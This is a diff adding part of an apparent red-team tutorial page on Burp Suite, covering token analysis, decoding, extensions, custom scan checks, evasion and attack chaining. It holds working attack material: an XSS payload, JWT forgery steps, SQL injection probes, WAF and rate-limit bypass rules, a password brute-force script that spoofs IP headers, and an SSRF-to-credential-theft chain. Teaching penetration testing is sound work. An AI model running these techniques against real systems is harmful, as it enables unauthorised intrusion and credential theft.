+      lead to session hijacking, token prediction, and authentication bypass attacks.
+    </p>
+
+    <div class="tool-grid">
+      <div class="tool-card">
+        <div class="tool-card__icon">&#x1F4E1;</div>
+        <h4 class="tool-card__title">Live Capture</h4>
+        <p class="tool-card__desc">
+          Automatically sends repeated requests to collect tokens from the application in real-time.
+          Configure the request and define the token location for automated collection of thousands of samples.
+        </p>
+      </div>
+      <div class="tool-card">
+        <div class="tool-card__icon">&#x1F4CB;</div>
+        <h4 class="tool-card__title">Manual Load</h4>
+        <p class="tool-card__desc">
+          Load pre-collected tokens from a file or paste them directly for analysis. Useful when
+          tokens were collected through other means (scripts, logs, Intruder results).
+        </p>
+      </div>
+    </div>
+
+    <h3>Randomness Tests</h3>
+    <ul class="feature-list">
+      <li><strong>FIPS Monobit Test:</strong> Checks the proportion of ones and zeros in the binary representation</li>
+      <li><strong>FIPS Poker Test:</strong> Analyzes the distribution of 4-bit segments for uniform distribution</li>
+      <li><strong>FIPS Runs Test:</strong> Examines consecutive sequences of identical bits for expected patterns</li>
+      <li><strong>FIPS Long Runs Test:</strong> Detects unusually long runs of identical bits that indicate weak randomness</li>
+      <li><strong>Spectral Tests:</strong> Performs frequency domain analysis to detect periodic patterns in token generation</li>
+    </ul>
+
+    <div class="screenshot">
+      <div class="screenshot__bar">
+        <span class="screenshot__dot screenshot__dot--red"></span>
+        <span class="screenshot__dot screenshot__dot--yellow"></span>
+        <span class="screenshot__dot screenshot__dot--green"></span>
+        <span class="screenshot__title">Burp Suite - Sequencer &gt; Analysis Results</span>
+      </div>
+      <div class="screenshot__content">
+        <div class="screenshot__metric">
+          <span class="screenshot__metric-label">Overall result:</span>
+          <span class="screenshot__metric-value screenshot__metric-value--good">Excellent (entropy = 119.2 bits)</span>
+        </div>
+        <div class="screenshot__metric">
+          <span class="screenshot__metric-label">Effective entropy:</span>
+          <span class="screenshot__metric-value">119.2 / 128 bits</span>
+        </div>
+        <div class="screenshot__metric">
+          <span class="screenshot__metric-label">Reliability:</span>
+          <span class="screenshot__metric-value">Significant (10,000 samples)</span>
+        </div>
+        <div class="screenshot__metric">
+          <span class="screenshot__metric-label">Sample size:</span>
+          <span class="screenshot__metric-value">10,000 tokens collected</span>
+        </div>
+        <div class="screenshot__bar-chart">
+          <div class="screenshot__bar-item">
+            <span>Character-level: </span>
+            <span class="screenshot__progress"><span class="screenshot__progress-fill" style="width: 93%"></span></span>
+            <span>93%</span>
+          </div>
+          <div class="screenshot__bar-item">
+            <span>Bit-level:      </span>
+            <span class="screenshot__progress"><span class="screenshot__progress-fill" style="width: 95%"></span></span>
+            <span>95%</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="exercise">
+      <div class="exercise-header">
+        <span class="exercise-number">7</span>
+        Exercise: Session Token Analysis
+      </div>
+      <div class="exercise-body">
+        <p><strong>Objective:</strong> Analyze the randomness of session tokens to determine if they are predictable.</p>
+        <ol>
+          <li>Identify the request that generates a new session token (usually login or session-creation endpoint).</li>
+          <li>Send the request to Sequencer via right-click &rarr; "Send to Sequencer".</li>
+          <li>In Sequencer, configure the token location: select <strong>Cookie</strong> and specify the session cookie name (e.g., <code>JSESSIONID</code>).</li>
+          <li>Click <strong>"Start live capture"</strong> and collect at least 5,000-10,000 tokens.</li>
+          <li>Click <strong>"Analyze now"</strong> to run the statistical tests.</li>
+          <li>Review the results: entropy below 64 bits is considered weak, above 100 bits is generally secure.</li>
+        </ol>
+        <p><strong>Expected Result:</strong> A well-implemented token generator should show entropy &gt; 100 bits and pass all FIPS tests. Low entropy suggests predictable tokens that could be brute-forced.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== DECODER ===== -->
+  <section id="decoder" class="guide-section">
+    <div class="section-header">
+      <span class="section-label">// ADVANCED TOOLS</span>
+      <h2 class="section-title">Decoder</h2>
+    </div>
+
+    <p class="section-intro">
+      Decoder provides tools for transforming encoded data into different formats. It supports a wide
+      range of encoding schemes, hashing algorithms, and data transformations that are essential for
+      analyzing and crafting payloads during web application testing. The smart decode feature
+      automatically recognizes and decodes common encoding patterns.
+    </p>
+
+    <h3>Supported Transformations</h3>
+    <div class="table-wrapper">
+      <table>
+        <thead>
+          <tr>
+            <th>Category</th>
+            <th>Transformation</th>
+            <th>Example</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>URL Encoding</td>
+            <td>Encode / Decode</td>
+            <td><code>test&amp;value</code> &rarr; <code>test%26value</code></td>
+          </tr>
+          <tr>
+            <td>HTML Encoding</td>
+            <td>Encode / Decode</td>
+            <td><code>&lt;script&gt;</code> &rarr; <code>&amp;lt;script&amp;gt;</code></td>
+          </tr>
+          <tr>
+            <td>Base64</td>
+            <td>Encode / Decode</td>
+            <td><code>admin:password</code> &rarr; <code>YWRtaW46cGFzc3dvcmQ=</code></td>
+          </tr>
+          <tr>
+            <td>Hex Encoding</td>
+            <td>ASCII Hex / Decode</td>
+            <td><code>test</code> &rarr; <code>74657374</code></td>
+          </tr>
+          <tr>
+            <td>Hashing</td>
+            <td>MD5 / SHA-1 / SHA-256 / SHA-512</td>
+            <td>One-way hash generation</td>
+          </tr>
+          <tr>
+            <td>Gzip / Deflate</td>
+            <td>Compress / Decompress</td>
+            <td>Binary compression formats</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>Smart Decode</h3>
+    <p>Decoder's Smart Decode automatically recognizes and applies the correct decoding sequence:</p>
+    <div class="code-block" data-lang="Decoder">
+      <pre ngNonBindable><code># Input (multiple encoding layers):
+JTNDc2NyaXB0JTNFYWxlcnQoMSklM0MlMkZzY3JpcHQlM0U=
+
+# Smart Decode Step 1 - Base64 Decode:
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+
+# Smart Decode Step 2 - URL Decode:
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+# Result: Double-encoded XSS payload revealed</code></pre>
+    </div>
+
+    <div class="exercise">
+      <div class="exercise-header">
+        <span class="exercise-number">8</span>
+        Exercise: JWT Analysis
+      </div>
+      <div class="exercise-body">
+        <p><strong>Objective:</strong> Decode and analyze a JSON Web Token to identify vulnerabilities.</p>
+        <div class="code-block" data-lang="JWT">
+          <pre ngNonBindable><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
+eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6
+InVzZXIiLCJyb2xlIjoiYWRtaW4iLCJpYXQi
+OjE3MDAwMDAwMDB9.
+SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</code></pre>
+        </div>
+        <ol>
+          <li>Copy the JWT from a captured request (usually in <code>Authorization: Bearer</code> header or cookie).</li>
+          <li>Paste each section (split by dots) into Decoder and Base64 decode.</li>
+          <li>Examine the <strong>header</strong>: check the algorithm (<code>alg</code>) &mdash; look for <code>none</code>, <code>HS256</code> (symmetric), or <code>RS256</code>.</li>
+          <li>Examine the <strong>payload</strong>: look for sensitive claims like <code>role</code>, <code>admin</code>, <code>exp</code> (expiration).</li>
+          <li>Test the <code>alg: none</code> attack &mdash; change the header to <code>&#123;"alg":"none","typ":"JWT"&#125;</code>, modify the payload, and remove the signature.</li>
+          <li>Test HMAC confusion: If the server expects RS256, try sending HS256 with the public key as the secret.</li>
+        </ol>
+        <p><strong>Pro Tip:</strong> Use the <strong>JWT Editor</strong> BApp extension for advanced JWT attacks including key confusion, JWK injection, and kid manipulation.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== COMPARER ===== -->
+  <section id="comparer" class="guide-section">
+    <div class="section-header">
+      <span class="section-label">// ADVANCED TOOLS</span>
+      <h2 class="section-title">Comparer</h2>
+    </div>
+
+    <p class="section-intro">
+      Comparer performs side-by-side comparison of any two data items (requests, responses, or arbitrary text).
+      It highlights differences at both word and byte levels, making it invaluable for detecting subtle
+      variations in application behavior that indicate vulnerabilities. Comparer is your essential tool
+      for identifying blind injection points and access control issues.
+    </p>
+
+    <h3>Comparison Modes</h3>
+    <ul class="feature-list">
+      <li><strong>Word-Level Diff:</strong> Highlights differences at the word boundary &mdash; ideal for comparing HTML responses and JSON data</li>
+      <li><strong>Byte-Level Diff:</strong> Shows exact byte differences &mdash; essential for binary data and detecting single-character variations</li>
+      <li><strong>Sync Scrolling:</strong> Both panels scroll together to maintain alignment during review</li>
+    </ul>
+
+    <div class="tool-grid">
+      <div class="tool-card">
+        <div class="tool-card__icon">&#x1F513;</div>
+        <h4 class="tool-card__title">Auth Testing</h4>
+        <p class="tool-card__desc">
+          Compare responses between authenticated and unauthenticated requests to identify
+          information disclosure. Differences reveal what data is protected by authentication.
+        </p>
+      </div>
+      <div class="tool-card">
+        <div class="tool-card__icon">&#x1F50D;</div>
+        <h4 class="tool-card__title">Blind Injection</h4>
+        <p class="tool-card__desc">
+          Detect blind SQL injection by comparing responses to true/false conditions.
+          Subtle differences in response length, content, or timing reveal injection points.
+        </p>
+      </div>
+      <div class="tool-card">
+        <div class="tool-card__icon">&#x1F6E1;</div>
+        <h4 class="tool-card__title">Access Control</h4>
+        <p class="tool-card__desc">
+          Compare responses across different user roles (admin vs. regular user) to find
+          horizontal and vertical privilege escalation vulnerabilities.
+        </p>
+      </div>
+    </div>
+
+    <div class="exercise">
+      <div class="exercise-header">
+        <span class="exercise-number">9</span>
+        Exercise: Blind SQL Injection Detection
+      </div>
+      <div class="exercise-body">
+        <p><strong>Objective:</strong> Use Comparer to detect blind SQL injection through response analysis.</p>
+        <ol>
+          <li>In Repeater, send a request with a parameter set to a <strong>true condition</strong>: <code>id=1 AND 1=1</code>.</li>
+          <li>Right-click the response and select <strong>"Send to Comparer"</strong>.</li>
+          <li>Send another request with a <strong>false condition</strong>: <code>id=1 AND 1=2</code>.</li>
+          <li>Right-click this response and send to Comparer as well.</li>
+          <li>In Comparer, select both items and click <strong>"Words"</strong> or <strong>"Bytes"</strong> to view differences.</li>
+          <li>If the responses differ (different content, different length, different error messages), the parameter is likely vulnerable to blind SQL injection.</li>
+        </ol>
+        <p><strong>Key Indicator:</strong> Even a single-byte difference between true/false responses confirms the injection point. Look for differences in content length, HTML structure, or error messages.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== ORGANIZER ===== -->
+  <section id="organizer" class="guide-section">
+    <div class="section-header">
+      <span class="section-label">// ADVANCED TOOLS</span>
+      <h2 class="section-title">Organizer</h2>
+    </div>
+
+    <p class="section-intro">
+      Organizer is a tool for storing and annotating interesting HTTP requests and responses discovered
+      during testing. Think of it as your investigation notebook within Burp Suite &mdash; it helps you
+      keep track of notable findings, potential vulnerabilities, and items that require further investigation
+      during complex engagements.
+    </p>
+
+    <h3>Features</h3>
+    <ul class="feature-list">
+      <li><strong>Notes &amp; Annotations:</strong> Add detailed notes to any saved request explaining what you found and why it is interesting</li>
+      <li><strong>Custom Columns:</strong> Add custom data columns for categorization (severity, status, vulnerability type)</li>
+      <li><strong>Color Coding:</strong> Highlight items with different colors to indicate priority or category</li>
+      <li><strong>Sort &amp; Filter:</strong> Organize your findings by any column for efficient review and reporting</li>
+      <li><strong>Export:</strong> Export organized findings for report generation and team collaboration</li>
+    </ul>
+
+    <div class="tip-box">
+      <div class="tip-box__header">&#x1F4A1; Pro Tip</div>
+      <p>
+        Use color-coding consistently throughout your engagement: <strong style="color: #ff4444;">Red</strong> for confirmed
+        critical/high vulnerabilities, <strong style="color: #ffaa00;">Orange</strong> for potential issues needing validation,
+        <strong style="color: #44ff44;">Green</strong> for interesting but non-vulnerable behavior, and
+        <strong style="color: #4488ff;">Blue</strong> for informational notes. This system makes it easy to prioritize
+        follow-up testing and generate reports at the end of the engagement.
+      </p>
+    </div>
+  </section>
+
+  <!-- ===== EXTENSIONS ===== -->
+  <section id="extensions" class="guide-section">
+    <div class="section-header">
+      <span class="section-label">// EXTENSIONS &amp; API</span>
+      <h2 class="section-title">BApp Store &amp; Extensions</h2>
+    </div>
+
+    <p class="section-intro">
+      The BApp Store is Burp Suite's official marketplace for extensions that enhance and extend Burp's
+      capabilities. With hundreds of community and PortSwigger-developed extensions, you can add
+      specialized scanning checks, automate complex workflows, and integrate with external tools.
+      Extensions are written in Java, Python (Jython), or Ruby (JRuby) using the Montoya API.
+    </p>
+
+    <div class="tool-grid">
+      <div class="tool-card">
+        <div class="tool-card__icon">&#x1F511;</div>
+        <h4 class="tool-card__title">JWT Editor</h4>
+        <p class="tool-card__desc">
+          Edit, sign, and verify JSON Web Tokens directly within Burp. Test for algorithm confusion,
+          key injection, claim manipulation, and other JWT-specific vulnerabilities.
+        </p>
+      </div>
+      <div class="tool-card">
+        <div class="tool-card__icon">&#x1F6E1;</div>
+        <h4 class="tool-card__title">Autorize</h4>
+        <p class="tool-card__desc">
+          Automatically detect authorization vulnerabilities by replaying requests with different
+          user sessions. Tests for IDOR, horizontal/vertical privilege escalation, and missing
+          access controls across all proxied traffic.
+        </p>
+      </div>
+      <div class="tool-card">
+        <div class="tool-card__icon">&#x1F4CA;</div>
+        <h4 class="tool-card__title">Logger++</h4>
+        <p class="tool-card__desc">
+          Advanced logging extension with powerful filtering, column customization, and export
+          capabilities. Provides grep-like search across all logged traffic with regex support.
+        </p>
+      </div>
+      <div class="tool-card">
+        <div class="tool-card__icon">&#x1F680;</div>
+        <h4 class="tool-card__title">ActiveScan++</h4>
+        <p class="tool-card__desc">
+          Extends Burp's active scanner with additional checks for host header attacks, cache
+          poisoning, DNS rebinding, and other vulnerabilities not covered by default scanning.
+        </p>
+      </div>
+      <div class="tool-card">
+        <div class="tool-card__icon">&#x2699;</div>
+        <h4 class="tool-card__title">Param Miner</h4>
+        <p class="tool-card__desc">
+          Discovers hidden and unlinked parameters by brute-forcing parameter names. Essential for
+          finding web cache poisoning vectors, hidden debug parameters, and undocumented API fields.
+        </p>
+      </div>
+      <div class="tool-card">
+        <div class="tool-card__icon">&#x1F3AD;</div>
+        <h4 class="tool-card__title">Hackvertor</h4>
+        <p class="tool-card__desc">
+          Tag-based encoding/decoding framework for creating complex payload transformations.
+          Supports nested tags, custom tags, and auto-encoding for WAF bypass and payload crafting.
+        </p>
+      </div>
+      <div class="tool-card">
+        <div class="tool-card__icon">&#x1F4DD;</div>
+        <h4 class="tool-card__title">AuthMatrix</h4>
+        <p class="tool-card__desc">
+          Matrix-based authorization testing for complex role hierarchies. Define users, roles,
+          and expected access levels, then automatically test every combination for access control flaws.
+        </p>
+      </div>
+      <div class="tool-card">
+        <div class="tool-card__icon">&#x270D;</div>
+        <h4 class="tool-card__title">SignSaboteur</h4>
+        <p class="tool-card__desc">
+          Manipulate signed tokens and session data. Supports JWT, session tokens with HMAC signatures,
+          and custom signing schemes. Test for signature bypass and key confusion vulnerabilities.
+        </p>
+      </div>
+    </div>
+
+    <h3>Installing Extensions</h3>
+    <div class="steps">
+      <div class="step">
+        <span class="step__number">1</span>
+        <div class="step__content">
+          Navigate to <strong>Extensions &rarr; BApp Store</strong> in Burp Suite.
+        </div>
+      </div>
+      <div class="step">
+        <span class="step__number">2</span>
+        <div class="step__content">
+          Search for the desired extension and review its description, rating, and compatibility.
+        </div>
+      </div>
+      <div class="step">
+        <span class="step__number">3</span>
+        <div class="step__content">
+          Click <strong>"Install"</strong>. For Jython-based extensions, ensure you have configured the
+          Jython standalone JAR path in <strong>Extensions &rarr; Extension Settings</strong>.
+        </div>
+      </div>
+      <div class="step">
+        <span class="step__number">4</span>
+        <div class="step__content">
+          Verify the extension is loaded in the <strong>Extensions &rarr; Installed</strong> tab.
+          Check the Output and Errors sub-tabs for any initialization issues.
+        </div>
+      </div>
+    </div>
+
+    <div class="exercise">
+      <div class="exercise-header">
+        <span class="exercise-number">10</span>
+        Exercise: Authorization Testing with Autorize
+      </div>
+      <div class="exercise-body">
+        <p><strong>Objective:</strong> Automatically detect authorization vulnerabilities across the application.</p>
+        <ol>
+          <li>Install the <strong>Autorize</strong> extension from the BApp Store.</li>
+          <li>Log in to the application as a <strong>low-privileged user</strong> and copy the session cookie.</li>
+          <li>In the Autorize tab, paste the low-privileged session cookie in the configuration area.</li>
+          <li>Optionally configure an <strong>unauthenticated</strong> session (no cookies) for testing authentication requirements.</li>
+          <li>Click <strong>"Autorize is turned off"</strong> to enable it (changes to "Autorize is turned on").</li>
+          <li>Now log in as an <strong>admin/high-privileged user</strong> and browse the application normally.</li>
+          <li>Autorize will automatically replay every request with the low-privileged cookie and show a color-coded comparison.</li>
+        </ol>
+        <p><strong>Results Interpretation:</strong></p>
+        <ul>
+          <li><span style="color: #ff4444;"><strong>Red:</strong></span> Enforcement is bypassed &mdash; the low-privileged user can access the resource (vulnerability confirmed)</li>
+          <li><span style="color: #ffaa00;"><strong>Orange:</strong></span> Enforcement status is unclear &mdash; manual verification needed</li>
+          <li><span style="color: #44ff44;"><strong>Green:</strong></span> Enforcement is detected &mdash; access is properly restricted</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== MONTOYA API ===== -->
+  <section id="montoya" class="guide-section">
+    <div class="section-header">
+      <span class="section-label">// EXTENSIONS &amp; API</span>
+      <h2 class="section-title">Montoya API</h2>
+    </div>
+
+    <p class="section-intro">
+      The Montoya API is Burp Suite's modern Java API for building extensions. It replaced the legacy
+      <code>IBurpExtender</code> interface with a cleaner, more intuitive design based on dependency injection.
+      The API provides comprehensive access to all Burp Suite functionality, allowing you to create custom
+      scanning checks, modify traffic, build custom UI tabs, and automate complex testing workflows.
+    </p>
+
+    <h3>Extension Entry Point</h3>
+    <div class="code-block" data-lang="Java">
+      <pre ngNonBindable><code>import burp.api.montoya.BurpExtension;
+import burp.api.montoya.MontoyaApi;
+import burp.api.montoya.http.handler.*;
+import burp.api.montoya.http.message.requests.HttpRequest;
+import burp.api.montoya.http.message.responses.HttpResponse;
+
+public class MyExtension implements BurpExtension &#123;
+
+    private MontoyaApi api;
+
+    &#64;Override
+    public void initialize(MontoyaApi api) &#123;
+        this.api = api;
+        api.extension().setName("My Custom Extension");
+
+        // Register an HTTP handler to intercept traffic
+        api.http().registerHttpHandler(new HttpHandler() &#123;
+
+            &#64;Override
+            public RequestToBeSentAction handleHttpRequestToBeSent(
+                    HttpRequestToBeSent request) &#123;
+
+                // Add custom header to all requests
+                HttpRequest modified = request.withAddedHeader(
+                    "X-Custom-Header", "PinkOffense-Scanner"
+                );
+
+                api.logging().logToOutput(
+                    "Request to: " + request.url()
+                );
+
+                return RequestToBeSentAction.continueWith(modified);
+            &#125;
+
+            &#64;Override
+            public ResponseReceivedAction handleHttpResponseReceived(
+                    HttpResponseReceived response) &#123;
+
+                // Log responses with interesting status codes
+                int statusCode = response.statusCode();
+                if (statusCode == 403 || statusCode == 401) &#123;
+                    api.logging().logToOutput(
+                        "Auth response: " + statusCode
+                            + " from " + response.initiatingRequest().url()
+                    );
+                &#125;
+
+                return ResponseReceivedAction.continueWith(response);
+            &#125;
+        &#125;);
+
+        api.logging().logToOutput("Extension loaded successfully!");
+    &#125;
+&#125;</code></pre>
+    </div>
+
+    <h3>Common Use Cases</h3>
+    <ul class="feature-list">
+      <li><strong>Custom Scan Checks:</strong> Implement <code>ScanCheck</code> interface to add application-specific vulnerability detection to the Scanner</li>
+      <li><strong>HTTP Traffic Modification:</strong> Register <code>HttpHandler</code> to automatically modify requests/responses passing through Burp</li>
+      <li><strong>Session Handling:</strong> Create custom session handling actions to maintain authentication state during automated testing</li>
+      <li><strong>Custom UI Tabs:</strong> Build rich Java Swing interfaces within Burp for specialized workflows and dashboards</li>
+      <li><strong>Context Menu Items:</strong> Add right-click menu options that integrate your custom logic with Burp's existing workflow</li>
+    </ul>
+  </section>
+
+  <!-- ===== BCHECKS ===== -->
+  <section id="bchecks" class="guide-section">
+    <div class="section-header">
+      <span class="section-label">// EXTENSIONS &amp; API</span>
+      <h2 class="section-title">BChecks</h2>
+    </div>
+
+    <p class="section-intro">
+      BChecks are custom scan checks written in Burp's domain-specific language (DSL). They provide
+      a lightweight alternative to full Java extensions for adding custom vulnerability detection
+      to the Scanner. BChecks can be passive (analyzing existing responses) or active (sending
+      additional requests) and are defined in simple, readable <code>.bcheck</code> files.
+    </p>
+
+    <h3>Passive BCheck Example</h3>
+    <div class="code-block" data-lang="BCheck">
+      <pre ngNonBindable><code>metadata:
+    language: v1-beta
+    name: "Debug Parameter Discovery"
+    description: "Detects debug parameters in responses"
+    author: "PinkOffense"
+    tags: "passive", "information-disclosure"
+
+given response then
+    if &#123;latest.response&#125; matches "(debug|test|staging)=(true|1|on|yes)" then
+        report issue:
+            severity: medium
+            confidence: firm
+            detail: "Debug parameter found in response"
+            remediation: "Remove debug parameters from production"
+    end if
+
+    if "X-Debug-Token" in &#123;latest.response.headers&#125; then
+        report issue:
+            severity: low
+            confidence: certain
+            detail: "Debug token header present: X-Debug-Token"
+            remediation: "Remove debug headers in production"
+    end if</code></pre>
+    </div>
+
+    <h3>Active BCheck Example</h3>
+    <div class="code-block" data-lang="BCheck">
+      <pre ngNonBindable><code>metadata:
+    language: v1-beta
+    name: "SSTI Detection"
+    description: "Tests for Server-Side Template Injection"
+    author: "PinkOffense"
+    tags: "active", "ssti", "injection"
+
+given insertion point then
+    send payload:
+        appending: "&#123;&#123;7*7&#125;&#125;"
+
+    if "49" in &#123;latest.response.body&#125; then
+        send payload:
+            appending: "&#123;&#123;7*'7'&#125;&#125;"
+
+        if "7777777" in &#123;latest.response.body&#125; then
+            report issue:
+                severity: high
+                confidence: firm
+                detail: "Jinja2 SSTI confirmed with payload reflection"
+                remediation: "Sanitize user input in template rendering"
+        end if
+    end if
+
+    send payload:
+        appending: "$&#123;7*7&#125;"
+
+    if "49" in &#123;latest.response.body&#125; then
+        report issue:
+            severity: high
+            confidence: tentative
+            detail: "Potential EL/FreeMarker SSTI detected"
+            remediation: "Validate and sanitize template expressions"
+    end if</code></pre>
+    </div>
+  </section>
+
+  <!-- ===== EVASION ===== -->
+  <section id="evasion" class="guide-section">
+    <div class="section-header">
+      <span class="section-label">// OFFENSIVE OPS</span>
+      <h2 class="section-title">Evasion Techniques</h2>
+    </div>
+
+    <p class="section-intro">
+      Modern web applications employ multiple layers of defense including Web Application Firewalls (WAFs),
+      rate limiting, bot detection, and behavioral analysis. As a red teamer, you need to understand and
+      bypass these defenses to accurately assess the application's security posture. Burp Suite provides
+      powerful capabilities for evading defensive controls.
+    </p>
+
+    <div class="evasion-columns">
+      <div class="evasion-column">
+        <h4>&#x1F6E1; WAF Bypass Techniques</h4>
+        <ul>
+          <li>Case alternation: <code>SeLeCt</code>, <code>UnIoN</code></li>
+          <li>Comment injection: <code>SEL/**/ECT</code></li>
+          <li>Double URL encoding: <code>%2527</code></li>
+          <li>Unicode normalization: <code>%u0027</code></li>
+          <li>Null byte injection: <code>%00</code></li>
+          <li>Chunked transfer encoding</li>
+          <li>HTTP Parameter Pollution (HPP)</li>
+          <li>JSON/XML content-type switching</li>
+          <li>Multipart boundary manipulation</li>
+          <li>HTTP/2 header smuggling</li>
+        </ul>
+      </div>
+      <div class="evasion-column">
+        <h4>&#x23F1; Rate Limit Evasion</h4>
+        <ul>
+          <li>IP rotation via X-Forwarded-For</li>
+          <li>X-Originating-IP header spoofing</li>
+          <li>X-Remote-IP / X-Client-IP headers</li>
+          <li>Request throttling (random delays)</li>
+          <li>Session token rotation</li>
+          <li>Distributed requests across endpoints</li>
+          <li>HTTP method switching (GET/POST)</li>
+          <li>Path normalization bypass: <code>/./api/login</code></li>
+          <li>Case variation in URL paths</li>
+          <li>Adding trailing dots/slashes</li>
+        </ul>
+      </div>
+      <div class="evasion-column">
+        <h4>&#x1F916; Bot Detection Evasion</h4>
+        <ul>
+          <li>Realistic User-Agent rotation</li>
+          <li>Browser fingerprint spoofing</li>
+          <li>TLS fingerprint randomization</li>
+          <li>Referer header injection</li>
+          <li>Cookie jar maintenance</li>
+          <li>JavaScript rendering (Burp Browser)</li>
+          <li>Human-like request timing</li>
+          <li>Accept-Language header variation</li>
+          <li>Navigation sequence simulation</li>
+          <li>CAPTCHA token reuse/solving</li>
+        </ul>
+      </div>
+    </div>
+
+    <h3>WAF Bypass Match &amp; Replace Rules</h3>
+    <div class="code-block" data-lang="Match &amp; Replace">
+      <pre ngNonBindable><code># IP Rotation via Headers
+Type: Request header
+Match: ^$
+Replace: X-Forwarded-For: 10.0.0.&#123;random_int(1,254)&#125;
+
+# Add X-Originating-IP
+Type: Request header
+Match: ^$
+Replace: X-Originating-IP: 192.168.1.&#123;random_int(1,254)&#125;
+
+# Bypass WAF with Content-Type manipulation
+Type: Request header
+Match: Content-Type: application/x-www-form-urlencoded
+Replace: Content-Type: application/json
+
+# Inject Fake Internal Header
+Type: Request header
+Match: ^$
+Replace: X-Custom-IP-Authorization: 127.0.0.1
+
+# HTTP Method Override
+Type: Request header
+Match: ^$
+Replace: X-HTTP-Method-Override: PUT</code></pre>
+    </div>
+
+    <h3>Turbo Intruder Script</h3>
+    <p>Use Turbo Intruder for high-speed, evasive payload delivery:</p>
+    <div class="code-block" data-lang="Python">
+      <pre ngNonBindable><code>def queueRequests(target, wordlists):
+    engine = RequestEngine(
+        endpoint=target.endpoint,
+        concurrentConnections=5,
+        requestsPerConnection=100,
+        pipeline=True
+    )
+
+    # Rate-limited brute force with random delays
+    import random
+    import time
+
+    for word in open('/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt'):
+        # Random delay between 0.1 and 2 seconds
+        time.sleep(random.uniform(0.1, 2.0))
+
+        # Rotate source IP headers
+        fake_ip = f"10.&#123;random.randint(0,255)&#125;.&#123;random.randint(0,255)&#125;.&#123;random.randint(1,254)&#125;"
+
+        engine.queue(
+            target.req,
+            [
+                word.strip(),
+                fake_ip
+            ],
+            gate='race1'
+        )
+
+    # Release all queued requests simultaneously (race condition)
+    engine.openGate('race1')
+
+
+def handleResponse(req, interesting):
+    if req.status == 200:
+        table.add(req)</code></pre>
+    </div>
+
+    <h3>TLS Fingerprint Evasion</h3>
+    <div class="feature-grid">
+      <div class="feature-card">
+        <div class="feature-card__icon">&#x1F510;</div>
+        <div class="feature-card__title">Cipher Suite Rotation</div>
+        <div class="feature-card__desc">Randomize TLS cipher suite ordering to avoid JA3/JA3S fingerprint matching used by advanced WAFs.</div>
+      </div>
+      <div class="feature-card">
+        <div class="feature-card__icon">&#x1F504;</div>
+        <div class="feature-card__title">TLS Extension Shuffling</div>
+        <div class="feature-card__desc">Reorder TLS extensions and modify SNI behavior to evade fingerprint-based blocking systems.</div>
+      </div>
+      <div class="feature-card">
+        <div class="feature-card__icon">&#x1F30D;</div>
+        <div class="feature-card__title">ALPN Protocol Control</div>
+        <div class="feature-card__desc">Control Application-Layer Protocol Negotiation to mimic specific browser TLS handshake patterns.</div>
+      </div>
+      <div class="feature-card">
+        <div class="feature-card__icon">&#x1F575;</div>
+        <div class="feature-card__title">Session Resumption</div>
+        <div class="feature-card__desc">Leverage TLS session tickets and resumption to reduce handshake fingerprinting opportunities.</div>
+      </div>
+    </div>
+
+    <div class="tip-box">
+      <div class="tip-box__header">&#x1F4A1; Stealth Scanning</div>
+      <p>
+        For maximum stealth during red team engagements, combine multiple evasion techniques: use
+        Burp's built-in browser for realistic TLS fingerprints, rotate source IP headers, introduce
+        human-like timing with random delays, and distribute your scanning across multiple sessions
+        over several days. Configure Intruder to use a slow, randomized request rate and leverage
+        Turbo Intruder for precision timing attacks when needed.
+      </p>
+    </div>
+  </section>
+
+  <!-- ===== ATTACK CHAINING ===== -->
+  <section id="attack-chaining" class="guide-section">
+    <div class="section-header">
+      <span class="section-label">// OFFENSIVE OPS</span>
+      <h2 class="section-title">Attack Chaining</h2>
+    </div>
+
+    <p class="section-intro">
+      Real-world exploitation rarely relies on a single vulnerability. Attack chaining combines multiple
+      lower-severity findings into a high-impact exploit chain. Burp Suite's interconnected tools make
+      it the ideal platform for discovering and validating multi-stage attack paths that demonstrate
+      maximum business impact during red team engagements.
+    </p>
+
+    <h3>Example Attack Chain: IDOR &rarr; SSRF &rarr; LFI &rarr; RCE</h3>
+    <div class="attack-chain">
+      <div class="chain-step">
+        <div class="chain-step__number">1</div>
+        <div class="chain-step__content">
+          <h4>IDOR - Insecure Direct Object Reference</h4>
+          <p>
+            Use Intruder to enumerate user IDs on <code>/api/users/&#123;id&#125;/profile</code>.
+            Discover an admin profile with an internal service URL stored in the <code>avatar_url</code> field.
+          </p>
+          <span class="chain-step__tool">Tool: Intruder + Repeater</span>
+        </div>
+        <div class="chain-step__arrow">&#x25BC;</div>
+      </div>
+      <div class="chain-step">
+        <div class="chain-step__number">2</div>
+        <div class="chain-step__content">
+          <h4>SSRF - Server-Side Request Forgery</h4>
+          <p>
+            The <code>avatar_url</code> field is fetched server-side. Modify it to
+            <code>http://169.254.169.254/latest/meta-data/</code> using Repeater to access AWS metadata,
+            or probe internal network services on <code>http://10.0.0.0/24:8080</code>.
+          </p>
+          <span class="chain-step__tool">Tool: Repeater + Collaborator</span>
+        </div>
+        <div class="chain-step__arrow">&#x25BC;</div>
+      </div>
+      <div class="chain-step">
+        <div class="chain-step__number">3</div>
+        <div class="chain-step__content">
+          <h4>LFI - Local File Inclusion</h4>
+          <p>
+            Through SSRF, discover an internal admin panel with a file viewer feature. Exploit the
+            <code>file</code> parameter with <code>file:///etc/passwd</code> and then
+            <code>file:///proc/self/environ</code> to leak environment variables and credentials.
+          </p>
+          <span class="chain-step__tool">Tool: Repeater</span>
+        </div>
+        <div class="chain-step__arrow">&#x25BC;</div>
+      </div>
+      <div class="chain-step">
+        <div class="chain-step__number">4</div>
+        <div class="chain-step__content">
+          <h4>RCE - Remote Code Execution</h4>
+          <p>
+            Leaked credentials from environment variables provide access to an internal Jenkins instance.
+            Use Burp to authenticate and exploit the Script Console to achieve Remote Code Execution on
+            the server, gaining full control of the target infrastructure.
